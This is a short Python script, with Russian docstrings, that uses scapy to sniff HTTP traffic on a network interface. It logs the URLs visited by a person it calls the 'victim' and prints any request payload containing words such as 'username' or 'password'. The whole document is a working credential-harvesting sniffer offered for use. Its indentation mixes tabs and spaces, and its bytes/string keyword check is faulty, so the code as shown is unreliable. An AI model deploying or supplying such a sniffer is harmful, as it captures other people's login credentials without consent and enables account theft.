#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse

def get_interface():
    '''
    DOCSTRING: Получить интерфейс при запуске скрипта
    INPUT: Нет
    OUTPUT: Сетевой интерфейс
    '''
	parser = argparse.ArgumentParser()
	parser.add_argument("-i", "--interface", dest="interface", help="[-] Write interface to sniff")
	arg = parser.parse_args()
	if not arg.interface:
		parser.error("[-] There is no arguments here. Use --help for help")
    return arg.interface

def sniff(interface):
    '''
    DOCSTRING: Прочитать данные из пакетов
    INPUT: Интерфейс
    OUTPUT: Нет
    '''
    scapy.sniff(iface=interface, store=False, prn=sniff_packet)

def get_url_address(packet):
    '''
    DOCSTRING: Получить url-адрес сайта, открытого жертвой
    INPUT: Пакет
    OUTPUT: URL-адрес сайта
    '''
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_information(packet):
    '''
    DOCSTRING: Получить ценную информацию, использованную жертвой
    INPUT: Пакет
    OUTPUT: Загруженные данные
    '''
    if packet.haslayer(scapy.Raw):
        LoadingData = packet[scapy.Raw].load
        keywords = ["username", "password", "user", "pass", "login"]
        for element in keywords:
            if element in LoadingData:
                return LoadingData

def sniff_packet(packet):
    '''
    DOCSTRING: Чтение пакетов, вывод ценной информации в консоль
    INPUT: Пакет
    OUTPUT: Нет
    '''
    if packet.haslayer(http.HTTPRequest):
        URLaddress = get_url_address(packet)
        print("[+] HTTP Request >> " + str(URLaddress))
        login_information = get_information(packet)
        if login_information:
            print("\n\n\n[+] Username/password" + login_information + "\n\n\n")

arg = get_interface()
sniff(arg)